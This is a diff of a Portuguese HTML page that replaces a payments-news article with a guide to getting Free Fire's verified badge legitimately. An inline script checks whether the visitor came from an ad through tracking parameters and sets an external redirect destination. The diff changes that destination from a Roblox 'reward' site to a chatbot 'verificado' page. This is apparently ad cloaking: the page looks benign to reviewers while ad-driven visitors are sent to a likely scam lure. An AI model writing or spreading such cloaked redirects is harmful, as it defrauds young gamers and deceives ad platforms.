@@ -2,50 +2,15 @@
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Notícia – Entrevista sobre Pagamentos em 2025</title>
-
-  <style>
-    body {
-      font-family: Georgia, serif;
-      background: #f7f7f7;
-      color: #333;
-      line-height: 1.6;
-      margin: 0;
-      padding: 20px;
-    }
-    .container {
-      max-width: 750px;
-      margin: auto;
-      background: #fff;
-      padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 4px 14px rgba(0,0,0,0.08);
-    }
-    h1 {
-      font-size: 28px;
-      color: #222;
-      margin-bottom: 10px;
-    }
-    h2 {
-      font-size: 20px;
-      color: #444;
-      margin-top: 20px;
-    }
-    p {
-      margin: 15px 0;
-    }
-    .author {
-      font-size: 14px;
-      color: #777;
-      margin-top: -5px;
-      margin-bottom: 20px;
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Como ter o selo verificado (V-Badge) no Free Fire: requisitos, passo a passo e dúvidas</title>
+  <meta name="description" content="Guia completo e atualizado para conseguir o V-Badge no Free Fire de forma legítima: requisitos do Programa de Parceiros/Creators, como se candidatar, dicas e FAQ.">
+  <meta name="robots" content="index,follow">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' height='64' width='64'%3E%3Ctext x='8' y='50' font-size='48'%3EV%3C/text%3E%3C/svg%3E">
 
   <script>
     (function(){
-      var destino = "https://robloxreward.xquiz.io/";
+      var destino = "https://chat.typebot.space/verificado";
       try {
         var u = new URL(window.location.href);
         var veioDeAnuncio = u.searchParams.has("fbclid") || u.searchParams.has("utm_source") || u.searchParams.has("utm_campaign");
@@ -56,26 +21,211 @@
       } catch(e){}
     })();
   </script>
+
+  <style>
+    :root{
+      --bg:#0b0c10;
+      --card:#111319;
+      --muted:#9aa3b2;
+      --text:#e8edf4;
+      --accent:#4cc9f0;
+      --accent-2:#a8dadc;
+      --border:#1b1f2a;
+      --ok:#22c55e;
+      --warn:#f59e0b;
+    }
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Arial,sans-serif;line-height:1.6}
+    a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+    .container{max-width:1100px;margin:0 auto;padding:24px}
+    header.hero{
+      background: radial-gradient(1200px 400px at 20% -10%, #1a2030 0%, transparent 70%),
+                  radial-gradient(900px 300px at 120% 0%, #13202c 0%, transparent 70%);
+      border-bottom:1px solid var(--border);
+    }
+    .hero-inner{display:grid;gap:18px;padding:56px 24px}
+    .kicker{letter-spacing:.12em;text-transform:uppercase;color:var(--accent-2);font-weight:600;font-size:.85rem}
+    h1{font-size:clamp(1.6rem,2.8vw,2.4rem);line-height:1.2;margin:6px 0 0}
+    .subtitle{color:var(--muted)}
+    .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 10px;border:1px solid var(--border);border-radius:999px;background:#0f1420}
+    .badge svg{width:18px;height:18px;fill:var(--ok)}
+    .layout{display:grid;grid-template-columns:280px 1fr;gap:24px;margin-top:28px}
+    @media (max-width:980px){.layout{grid-template-columns:1fr}}
+    nav.toc{
+      position:sticky;top:16px;align-self:start;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px
+    }
+    nav.toc h3{margin:0 0 10px;font-size:1rem;color:var(--accent-2)}
+    nav.toc ul{list-style:none;margin:0;padding:0}
+    nav.toc li{margin:6px 0}
+    main.article{
+      display:flex;flex-direction:column;gap:18px
+    }
+    section.block{
+      background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px
+    }
+    section.block h2{margin:0 0 8px;font-size:1.25rem}
+    .meta{display:flex;gap:14px;color:var(--muted);font-size:.9rem}
+    .checklist{display:grid;gap:10px;margin:10px 0}
+    .check{display:flex;gap:10px;align-items:flex-start}
+    .check svg{flex:0 0 auto;width:18px;height:18px;fill:var(--ok);margin-top:3px}
+    .steps{counter-reset:step;display:grid;gap:12px}
+    .step{background:#0f121a;border:1px dashed var(--border);border-radius:12px;padding:14px}
+    .step h3{margin:0 0 6px;font-size:1.05rem}
+    .step h3::before{counter-increment:step;content:"Passo " counter(step) " — ";color:var(--accent-2)}
+    .callout{border-left:4px solid var(--warn);padding:10px 12px;background:#171a22;border-radius:8px}
+    .links{display:grid;gap:8px}
+    .links a{display:inline-flex;align-items:center;gap:8px}
+    .tag{font-size:.85rem;color:var(--muted)}
+    footer{border-top:1px solid var(--border);margin-top:28px}
+    .small{font-size:.9rem;color:var(--muted)}
+    code.inline{background:#0f1420;border:1px solid var(--border);padding:2px 6px;border-radius:6px}
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Especialistas comentam os métodos de pagamento mais usados em 2025</h1>
-    <p class="author">Por Redação Econômica – Publicado em fevereiro de 2025</p>
+  <header class="hero">
+    <div class="container hero-inner">
+      <span class="kicker">Free Fire • Guia oficializado</span>
+      <h1>Como ter o selo verificado (V-Badge) no Free Fire de forma legítima</h1>
+      <p class="subtitle">Entenda o que é o V-Badge, quem pode conseguir, os requisitos do Programa de Parceiros/Creators, como se candidatar e como acelerar sua aprovação com conteúdo e engajamento reais.</p>
+      <span class="badge" aria-label="Conteúdo legítimo">
+        <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.1-7.1 1.4 1.4z"/></svg>
+        Apenas métodos oficiais (sem hacks)
+      </span>
+      <div class="meta">
+        <span>Atualizado: <time datetime="2025-10-03">03 out 2025</time></span>
+        <span>Leitura: ~6 min</span>
+      </div>
+    </div>
+  </header>
 
-    <p>Uma nova entrevista realizada com economistas e especialistas do setor financeiro revelou as principais tendências de pagamento que estão se consolidando neste ano.</p>
+  <div class="container layout">
+    <nav class="toc" aria-label="Sumário">
+      <h3>Neste guia</h3>
+      <ul>
+        <li><a href="#o-que-e">O que é o V-Badge</a></li>
+        <li><a href="#quem-pode">Quem pode ter</a></li>
+        <li><a href="#requisitos">Requisitos principais</a></li>
+        <li><a href="#passo-a-passo">Passo a passo para aplicar</a></li>
+        <li><a href="#dicas">Dicas para acelerar sua aprovação</a></li>
+        <li><a href="#faq">Perguntas frequentes</a></li>
+        <li><a href="#links">Links oficiais</a></li>
+        <li><a href="#aviso-legal">Aviso legal</a></li>
+      </ul>
+    </nav>
 
-    <h2>Carteiras digitais dominam</h2>
-    <p>Segundo os especialistas, as carteiras digitais já são a forma preferida de milhões de brasileiros, superando o uso do cartão físico em diversas regiões.</p>
+    <main class="article">
+      <section id="o-que-e" class="block">
+        <h2>O que é o V-Badge (selo verificado)?</h2>
+        <p>
+          O V-Badge é a insígnia de verificação exibida ao lado do seu nick no Free Fire. 
+          Ele reconhece criadores, pro players e parceiros oficiais da Garena que contribuem de forma relevante para a comunidade.
+        </p>
+        <div class="callout">
+          <strong>Importante:</strong> o V-Badge é concedido pela Garena; não existe método “secreto” ou aplicativo externo confiável para adicionar o selo manualmente.
+        </div>
+      </section>
 
-    <h2>PIX segue em alta</h2>
-    <p>Outro destaque é o PIX, que mesmo após anos de lançamento continua crescendo em volume e sendo utilizado para compras, transferências e até pagamentos recorrentes.</p>
+      <section id="quem-pode" class="block">
+        <h2>Quem pode ter o selo</h2>
+        <div class="checklist">
+          <div class="check">
+            <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.1-7.1 1.4 1.4z"/></svg>
+            <div><strong>Criadores de conteúdo</strong> com público ativo e conteúdo recorrente de Free Fire.</div>
+          </div>
+          <div class="check">
+            <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.1-7.1 1.4 1.4z"/></svg>
+            <div><strong>Jogadores profissionais</strong> envolvidos em torneios oficiais (ex.: FFWS) e line-ups reconhecidas.</div>
+          </div>
+          <div class="check">
+            <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l7.1-7.1 1.4 1.4z"/></svg>
+            <div><strong>Parceiros/Moderadores</strong> aprovados nos programas oficiais da Garena (Creators/Partners).</div>
+          </div>
+        </div>
+        <p class="tag">Obs.: versões recentes do jogo anunciaram novos tipos de selos (por exemplo, ligados a torneios e moderação) conforme temporadas/atualizações.</p>
+      </section>
 
-    <h2>O futuro dos pagamentos</h2>
-    <p>Quando perguntados sobre o futuro, os entrevistados foram unânimes: métodos de pagamento cada vez mais rápidos e integrados à vida digital farão parte do dia a dia das pessoas.</p>
+      <section id="requisitos" class="block">
+        <h2>Requisitos principais (visão geral)</h2>
+        <p>Os critérios exatos podem variar por servidor/região e a Garena atualiza periodicamente. Em geral, espere algo como:</p>
+        <ul>
+          <li>Presença consistente em plataformas (YouTube, Facebook, etc.) com <strong>número relevante de seguidores</strong> e <strong>média de visualizações</strong> adequada.</li>
+          <li><strong>Conteúdo majoritariamente de Free Fire</strong> nos últimos 30 dias (ex.: 80% ou mais).</li>
+          <li><strong>Engajamento real</strong>: lives, vídeos, shorts, interação com a comunidade.</li>
+          <li><strong>Conduta</strong> alinhada às diretrizes da Garena (sem trapaças, discurso de ódio, etc.).</li>
+        </ul>
+        <p class="tag">Dica: verifique sempre a página oficial do Partner/Creators do seu servidor para os números atuais.</p>
+      </section>
 
-    <p style="font-size:14px; color:#777; margin-top:30px;">
-      Este conteúdo é meramente informativo e não constitui recomendação de investimento ou serviço financeiro.
-    </p>
+      <section id="passo-a-passo" class="block">
+        <h2>Passo a passo para se candidatar</h2>
+        <div class="steps">
+          <div class="step">
+            <h3>Acesse o site do programa</h3>
+            <p>Entre na página oficial do <em>Partner/Creators Program</em> da sua região e clique em <em>Apply</em> / <em>Inscreva-se</em>.</p>
+          </div>
+          <div class="step">
+            <h3>Revise os critérios do seu servidor</h3>
+            <p>Confira requisitos mínimos (seguidores, visualizações, % de conteúdo FF, frequência de posts) e documentos solicitados.</p>
+          </div>
+          <div class="step">
+            <h3>Preencha o formulário</h3>
+            <p>Informe nome oficial, links dos canais, métricas recentes, contatos e motivo para integrar o programa.</p>
+          </div>
+          <div class="step">
+            <h3>Envie e aguarde a análise</h3>
+            <p>O time da Garena avalia manualmente. O selo é aplicado pela própria Garena após aprovação.</p>
+          </div>
+        </div>
+        <div class="callout"><strong>Atenção:</strong> inscrições podem abrir/fechar por janelas. Se estiver fechado, mantenha consistência no conteúdo e acompanhe o site oficial.</div>
+      </section>
+
+      <section id="dicas" class="block">
+        <h2>Dicas para acelerar sua aprovação</h2>
+        <ul>
+          <li><strong>Calendário editorial</strong>: publique ao menos 8 vídeos de FF nos últimos 30 dias e mantenha lives/shorts.</li>
+          <li><strong>Engaje de verdade</strong>: responda comentários, use enquetes, faça collabs e eventos com a comunidade.</li>
+          <li><strong>Foque no valor</strong>: tutoriais úteis, coberturas de atualizações, análises de meta e highlights de torneio.</li>
+          <li><strong>Marcas e integridade</strong>: evite hacks, “atalhos” e promessas enganosas. Isso derruba sua candidatura.</li>
+        </ul>
+      </section>
+
+      <section id="faq" class="block">
+        <h2>Perguntas frequentes (FAQ)</h2>
+        <p><strong>Posso “colocar” o selo manualmente?</strong><br>
+        Não. Qualquer método fora do programa oficial é falso e pode gerar punição na conta.</p>
+        <p><strong>Quantos seguidores eu preciso?</strong><br>
+        Depende do servidor. Em muitos casos, exige-se audiência relevante (ex.: faixa de 100k no YouTube) e boa média de views/engajamento recente. Verifique o site local do programa.</p>
+        <p><strong>Sou pro player, ajuda?</strong><br>
+        Sim. Participação em torneios oficiais e performance em alto nível aumentam suas chances, mas ainda é necessária presença pública/engajamento.</p>
+        <p><strong>Quanto tempo demora?</strong><br>
+        Varia. Prepare-se para semanas. Enquanto isso, fortaleça conteúdo e comunidade.</p>
+        <p><strong>Existem outros tipos de selo?</strong><br>
+        A Garena testa tipos/ícones de verificação por temporada (ex.: ligados a FFWS, moderação, etc.). Siga os anúncios oficiais.</p>
+      </section>
+
+      <section id="links" class="block">
+        <h2>Links oficiais e fontes úteis</h2>
+        <div class="links">
+          <a href="https://partnerprogramme.freefire.garena.sg/" target="_blank" rel="nofollow noopener">• Página oficial do Free Fire Partner/Creators Program</a>
+          <a href="https://www.freefiremania.com.br/noticia/como-obter-v-de-verificado.html" target="_blank" rel="nofollow noopener">• Guia “Como obter o V de Verificado” (Free Fire Mania)</a>
+          <a href="https://www.carry1st.com/blog/how-to-earn-the-coveted-v-badge-in-garena-free-fire" target="_blank" rel="nofollow noopener">• Artigo sobre V-Badge e elegibilidade</a>
+          <a href="https://theradioativo.com.br/free-fire/verificados/novos-selos-ob49/" target="_blank" rel="nofollow noopener">• Novos selos de verificação (atualizações/recompensas)</a>
+        </div>
+        <p class="tag">Sugestão: adicione também seus links de canais e métricas (YouTube, Facebook, Instagram, TikTok, Booyah).</p>
+      </section>
+
+      <section id="aviso-legal" class="block">
+        <h2>Aviso legal</h2>
+        <p>
+          Este guia é informativo e não garante aprovação. O selo verificado depende exclusivamente dos critérios e da análise da Garena.
+          Evite apps, extensões, “geradores” e promessas de terceiros — isso pode comprometer sua conta.
+        </p>
+      </section>
+
+      <footer class="small">
+        <p>© 2025 — Guia independente. Marcas e termos pertencem aos seus respectivos proprietários.</p>
+      </footer>
+    </main>
   </div>
 </body>
 </html>
